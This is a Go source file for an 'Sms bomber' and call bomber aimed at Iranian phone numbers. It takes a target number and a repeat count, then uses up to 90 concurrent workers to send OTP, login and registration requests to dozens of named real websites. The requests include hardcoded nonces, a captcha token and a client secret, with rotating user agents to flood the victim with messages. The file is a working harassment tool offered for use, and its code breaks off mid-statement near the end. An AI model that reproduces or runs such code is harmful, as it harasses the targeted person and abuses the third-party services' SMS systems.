/* coded by @monsmain
⚠️NOTE en:
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
The right to use this code is reserved only for its owner; any unauthorized copying will be pursued to the full force of the law.
*/
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"net/http/cookiejar"
	"math/rand" 
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
}
//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        req.Header.Set("User-Agent", selectedUserAgent) 


		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	randomIndex := rand.Intn(len(userAgents))
	selectedUserAgent := userAgents[randomIndex]


	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
        req.Header.Set("User-Agent", selectedUserAgent)


		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p)
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}

func main() {

	rand.Seed(time.Now().UnixNano())

	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
            .%@@#  @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-   irani    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+   #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m156 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms&call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 
//Code by @monsmain
	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 90 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 40 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 40 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}//Code by @monsmain


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
        Timeout: 10 * time.Second,
	}

	tasks := make(chan func(), repeatCount*50)

	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*50)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {
		
		
		// api.ostadkr.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.ostadkr.com/login", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// caropex.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client)
		// narsisbeauty.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("phone_number", phone) 
				formData.Set("wupp_remember_me", "on") 
				formData.Set("action", "wupp_sign_up") 
				sendFormRequest(c, ctx, "https://narsisbeauty.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		//  toprayan.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("ByCode", "ورود با کد یک‌بارمصرف")
				formData.Set("Step", "EnterMobile")
				formData.Set("Mobile", phone)
				formData.Set("Password", "")    
				formData.Set("RememberMe", "false")
				formData.Set("VerifyCode", "")
				formData.Set("X-Requested-With", "XMLHttpRequest")
				sendFormRequest(c, ctx, "https://toprayan.com/account/login", formData, &wg, ch)
			}
		}(client)
		//takdoo.com
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("login_method", "code")
				formData.Set("phone_number", phone) 
				formData.Set("action", "ehraz_sms_otp_phone_verify")
				formData.Set("ehraz_nonce", "7e44e723bd") 
				sendFormRequest(c, ctx, "https://takdoo.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// oldpanel.avalpardakht.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"email":             "codedbymonsmain@gmail.com", 
					"is_business":       0, 
					"mobile":            phone, 
					"online_chat_token":     "", 
					"password":          "SecurePass123!", 
					"rules":             true,
				}
				sendJSONRequest(c, ctx, "https://oldpanel.avalpardakht.com/panel/api/v1/auth/register", payload, &wg, ch)
			}
		}(client)

		//masterkala.com  delete ❌
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				serviceURL := "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp"
				payload := map[string]interface{}{
					"phone": phone,
					"type": "sendotp",
				}
				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
			}
		}(client)

		// bitycle.com (JSON)   delete captcha❌
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"first_name":             "کاربر", 
					"g-recaptcha-response":       "03AFcWeA7Kjqyncl-yqP7O5kpLRzYMpOnkqk2ipXxcNNBCBl5-Tk705GSHDxuA6dKypAs4RejeD-HAoW1blo-yzNIaJzsIov2DJ2D-1Mw5IbbF7UzlEfnDfi1NbkOOo-IqEgsW55RylZhHAv4O4sAYp9nlTVl-HL29HPtlBJIi6jZGndn9FoyoI27UfUDGh57SA9DuIjYACATmdV7qMf7srIngSJtlLimO87-eW8jSJ1zGtm-I6-ndJ9mMF2Pn8dOJuCxK9cWw1CY6M2PqLK33TW1u2P9_gQm85185YqPnuAfbduGpF3oG98wCHapDVGLBguaLIyt0KaJzquJZUjp6WHnUPtQMBNxr4_2wXgH1nVfQU8tGeS1Ru27A5FG_yQAUAw40k_HPtO-WonRY-eOh-W3lYXN6oUiPsf1HPtOMyWzrdbHhDqnBRNhERebaiWDk35jJ0uZwmJ8sg0XtMtfEqxF7uCwwPqyAykXXIkiABxm3izdKntZ0OH4lBs-I4Ge-wx6GIXroG15bMSmkSmtKXpim7fG6lNlw7xIMVujmGH4KApQhOWoGZLpc_H5ELLN241naC5XwrYbZ3UVhxGr3sUgq-i2AFW1bKlD0yJcdwlC_gbiVPLwlLVn1D5K1OD9rP-fn9KeoBoxuBtXLlTmHTTX1GYoZG7v8HDqRhn0fyEKZeQUq7VZYjsuVR3kZwWNejVSndAkRNgEq7TPMVdS7fZYyB-1mGrRSO_IS7cVL4DbQuCHEVvoo31aqoY-OG7gooppUB8GXlyifZyQjUItyoaXsFR1yO6IUqv4P36EJZMOrxJVaHZSo9ITW8zW06ECAOF0GojmhzXuuVbe1YmaxvqZ1ezxQR2guVBOrzWyuaW19Hdc6exe5ttakofO84vfGm0exyXNmsGy4wfnSPmuwJZVJbFaCBe18FhZwsja4tfUJOoIOmknUsnhOtXjQOLAz0cRtDUK0B6e0q04oaLZpm__v3r2pkbwIycpM_87hy0n_nSkgDfCHo0-yvDysoSb37YAvMHI-8GuRfssFO4RoQcvkg9XTyb01_w", 
					"invite_code":     "", 
					"last_name":          "بدون نام", 
					"password":            "monsmain",
					"phone":            phone, 
				}
				sendJSONRequest(c, ctx, "https://api.bitycle.com/api/account/register", payload, &wg, ch)
			}
		}(client)

		// https://pirankalaco.ir/SendPhone.php (Form Data)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("phone", phone)
				formData.Set("csrf", "18f7cd28c5ca167e123c1d124da12e07385e8a89534cdb5f81c2378fb8cb2ed5")  // cheack
				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch) 
			}
		}(client) 

// --- 123kif - Register (POST, JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "firstName": "mons",
            "lastName": "main",
            "mobile": phone,
            "password": "monsmain@0",
            "platform": "web",
            "refferCode": "",
        }
        sendJSONRequest(c, ctx, "https://api.123kif.com/api/auth/Register", payload, &wg, ch)
    }
}(client)

// --- paaakar.com - register-login (POST, FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("version", "new1")
        formData.Set("mobile", phone)
        sendFormRequest(c, ctx, "https://api.paaakar.com/v1/customer/register-login?version=new1", formData, &wg, ch)
    }
}(client)

// --- alochand.com - register-login (POST, FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("version", "new1")
        formData.Set("mobile", phone)
        sendFormRequest(c, ctx, "https://api.alochand.com/v1/customer/register-login?version=new1", formData, &wg, ch)
    }
}(client)

// --- account724.com - wp-admin/admin-ajax.php (POST, FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("action", "stm_login_register")
        formData.Set("type", "mobile")
        formData.Set("input", phone)
        sendFormRequest(c, ctx, "https://account724.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }
}(client)
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 1. ultraamooz.com (POST, FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("action", "digits_check_mob")
        formData.Set("countrycode", "+98")
        formData.Set("mobileNo", formatPhoneWithSpaces(phone))
        formData.Set("csrf", "a6fd7f4d05")
        formData.Set("login", "2")
        formData.Set("username", "monsmain")
        formData.Set("email", "")
        formData.Set("captcha", "")
        formData.Set("captcha_ses", "")
        formData.Set("digits", "1")
        formData.Set("json", "1")
        formData.Set("whatsapp", "0")
        formData.Set("digits_reg_name", "monsmain")
        formData.Set("digits_reg_username", "monsmain")
        formData.Set("digregcode", "+98")
        formData.Set("digits_reg_mail", formatPhoneWithSpaces(phone))
        formData.Set("digregscode2", "+98")
        formData.Set("mobmail2", "")
        formData.Set("digits_reg_password", "")
        formData.Set("dig_otp", "")
        formData.Set("code", "")
        formData.Set("dig_reg_mail", "")
        formData.Set("dig_nounce", "a6fd7f4d05")
        sendFormRequest(c, ctx, "https://ultraamooz.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }
}(client)

// 2. api.pateh.com (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(c, ctx, "https://api.pateh.com/ath/auth/login-or-register", payload, &wg, ch)
    }
}(client)

// 3. aloghesti.com (POST, FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("login_digt_countrycode", "+98")
        formData.Set("digits_phone", getPhoneNumberNoZero(phone))
        formData.Set("action_type", "phone")
        formData.Set("digits_reg_name", "monsmain")
        formData.Set("digits_process_register", "1")
        formData.Set("sms_otp", "")
        formData.Set("otp_step_1", "1")
        formData.Set("digits_otp_field", "1")
        formData.Set("digits", "1")
        formData.Set("instance_id", "14a99a5919d973c4ac4f811d93cde732")
        formData.Set("action", "digits_forms_ajax")
        formData.Set("type", "login")
        formData.Set("digits_step_1_type", "")
        formData.Set("digits_step_1_value", "")
        formData.Set("digits_step_2_type", "")
        formData.Set("digits_step_2_value", "")
        formData.Set("digits_step_3_type", "")
        formData.Set("digits_step_3_value", "")
        formData.Set("digits_login_email_token", "")
        formData.Set("digits_redirect_page", "//aloghesti.com/?page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F")
        formData.Set("digits_form", "b3b7e8ee3b")
        formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F")
        formData.Set("show_force_title", "1")
        formData.Set("container", "digits_protected")
        formData.Set("sub_action", "sms_otp")
        sendFormRequest(c, ctx, "https://aloghesti.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }
}(client)

// 4. accounts.khanoumi.com/account/login/init (FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e")
        formData.Set("loginIdentifier", phone)
        formData.Set("loginSchemeName", "sms")
        sendFormRequest(c, ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
    }
}(client)

// 5. api.malltina.com/check-user (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "username": phone,
        }
        sendJSONRequest(c, ctx, "https://api.malltina.com/check-user", payload, &wg, ch)
    }
}(client)

// 6. api.malltina.com/profiles (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "password": "Monsmain1",
            "mobile": phone,
            "sign_up_referral_link": "https://www.google.com/",
        }
        sendJSONRequest(c, ctx, "https://api.malltina.com/profiles", payload, &wg, ch)
    }
}(client)

// 7. www.1001kharid.com/wp-admin/admin-ajax.php (FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("digt_countrycode", "+98")
        formData.Set("phone", formatPhoneWithSpaces(phone))
        formData.Set("email", "codedbymonsmain@gmail.com")
        formData.Set("digits_process_register", "1")
        formData.Set("sms_otp", "")
        formData.Set("digits_otp_field", "1")
        formData.Set("instance_id", "d6cb3048bb8d26ad37ff3614aca5af44")
        formData.Set("optional_data", "optional_data")
        formData.Set("action", "digits_forms_ajax")
        formData.Set("type", "register")
        formData.Set("dig_otp", "otp")
        formData.Set("digits", "1")
        formData.Set("digits_redirect_page", "//www.1001kharid.com/?page=2&redirect_to=https%3A%2F%2Fwww.1001kharid.com%2F")
        formData.Set("digits_form", "4b99e55cbf")
        formData.Set("_wp_http_referer", "/?login=true&page=2&redirect_to=https%3A%2F%2Fwww.1001kharid.com%2F")
        formData.Set("container", "digits_protected")
        formData.Set("sub_action", "sms_otp")
        sendFormRequest(c, ctx, "https://www.1001kharid.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }
}(client)

// 8. 1000gem.org/livewire/message/login-register (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "updates": []map[string]interface{}{
                {
                    "type": "syncInput",
                    "payload": map[string]interface{}{
                        "name": "phone",
                        "value": phone,
                        "id": "erab",
                    },
                },
                {
                    "type": "callMethod",
                    "payload": map[string]interface{}{
                        "id": "0k13",
                        "method": "sendsms",
                        "params": []string{},
                    },
                },
            },
        }
        sendJSONRequest(c, ctx, "https://1000gem.org/livewire/message/login-register", payload, &wg, ch)
    }
}(client)

// 9. market-backend.dgshahr.com/shop/user/user_login/ (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "phone_number": phone,
        }
        sendJSONRequest(c, ctx, "https://market-backend.dgshahr.com/shop/user/user_login/", payload, &wg, ch)
    }
}(client)

// 10. irani24.ir/signin?do (FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("do", "")
        formData.Set("user_mobile", phone)
        formData.Set("confirm_code", "")
        sendFormRequest(c, ctx, "https://irani24.ir/signin?do", formData, &wg, ch)
    }
}(client)

// 11. api.footballi.net/api/v2/user/check (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "login": phone,
            "country_code": "+98",
        }
        sendJSONRequest(c, ctx, "https://api.footballi.net/api/v2/user/check", payload, &wg, ch)
    }
}(client)

// 12. 70kala.ir/wp-admin/admin-ajax.php (FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("login_digt_countrycode", "+98")
        formData.Set("digits_phone", formatPhoneWithSpaces(phone))
        formData.Set("action_type", "phone")
        formData.Set("digits", "1")
        formData.Set("instance_id", "7b0048080e38e916af365b7a33363096")
        formData.Set("action", "digits_forms_ajax")
        formData.Set("type", "login")
        formData.Set("digits_step_1_type", "")
        formData.Set("digits_step_1_value", "")
        formData.Set("digits_step_2_type", "")
        formData.Set("digits_step_2_value", "")
        formData.Set("digits_step_3_type", "")
        formData.Set("digits_step_3_value", "")
        formData.Set("digits_login_email_token", "")
        formData.Set("digits_redirect_page", "//70kala.ir/?page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
        formData.Set("digits_form", "3057f39e8c")
        formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
        formData.Set("show_force_title", "1")
        sendFormRequest(c, ctx, "https://70kala.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
    }
}(client)

// 13. onlinekala.ir/login?back=my-account (FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("back", "my-account")
        formData.Set("username", phone)
        formData.Set("id_customer", "")
        formData.Set("firstname", "مانس")
        formData.Set("lastname", "مین")
        formData.Set("action", "register")
        formData.Set("ajax", "1")
        sendFormRequest(c, ctx, "https://www.onlinekala.ir/login?back=my-account", formData, &wg, ch)
    }
}(client)

// 14. evanhamrah.com/wp-admin/admin-ajax.php (FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("phone_number", phone)
        formData.Set("action", "ajax_login_register")
        formData.Set("wcp_nonce", "290a8a31b9")
        sendFormRequest(c, ctx, "https://evanhamrah.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }
}(client)

// 15. user.zirbana.com/v2/register (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "mobile": phone,
            "client_id": "12",
            "client_secret": "yKrlLyr4IBxXhZSyvjKZLObsUF8iSGNhtEEcjfIr",
        }
        sendJSONRequest(c, ctx, "https://user.zirbana.com/v2/register", payload, &wg, ch)
    }
}(client)

// 16. geminja.com/login?type=register (FORM)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        formData := url.Values{}
        formData.Set("type", "register")
        formData.Set("regMobile", phone)
        formData.Set("dlr-register", "ثبت نام")
        formData.Set("_dlr_mobits", "")
        formData.Set("register", "")
        sendFormRequest(c, ctx, "https://geminja.com/login?type=register", formData, &wg, ch)
    }
}(client)

// 17. api.arzplus.net/api/v1/accounts/signup/init/ (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "phone": phone,
        }
        sendJSONRequest(c, ctx, "https://api.arzplus.net/api/v1/accounts/signup/init/", payload, &wg, ch)
    }
}(client)

// 18. gooshi.online/site/api/v1/user/otp (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "mobile": phone,
            "name": "مانس مین",
            "national_code": "1000000000",
            "referrer": "گوگل",
            "return_url": "",
        }
        sendJSONRequest(c, ctx, "https://gooshi.online/site/api/v1/user/otp", payload, &wg, ch)
    }
}(client)

// 19. vidovin.com/Users/LoginPopup (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "MobileNo": phone,
        }
        sendJSONRequest(c, ctx, "https://www.vidovin.com/Users/LoginPopup", payload, &wg, ch)
    }
}(client)

// 20. my.limoome.com/auth/check-mobile (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "mobileNumber": getPhoneNumberNoZero(phone),
            "countryId": "1",
        }
        sendJSONRequest(c, ctx, "https://my.limoome.com/auth/check-mobile", payload, &wg, ch)
    }
}(client)

// 21. my.limoome.com/api/auth/login/otp (JSON)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        payload := map[string]interface{}{
            "mobileNumber": getPhoneNumberNoZero(phone),
            "country": "1",
        }
        sendJSONRequest(c, ctx, "https://my.limoome.com/api/auth/login/otp", payload, &wg, ch)
    }
}(client)

// 22. ws.alibaba.ir/api/v3/account/mobile/otp (JSON + custom header)
wg.Add(1)
tasks <- func(c *http.Client) func() {
    return func() {
        headers := map[string]string{
            "Host":            "ws.alibaba.ir",
            "User-Agent":     *
	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
/* coded by @monsmain
⚠️note: copy mamnoe.
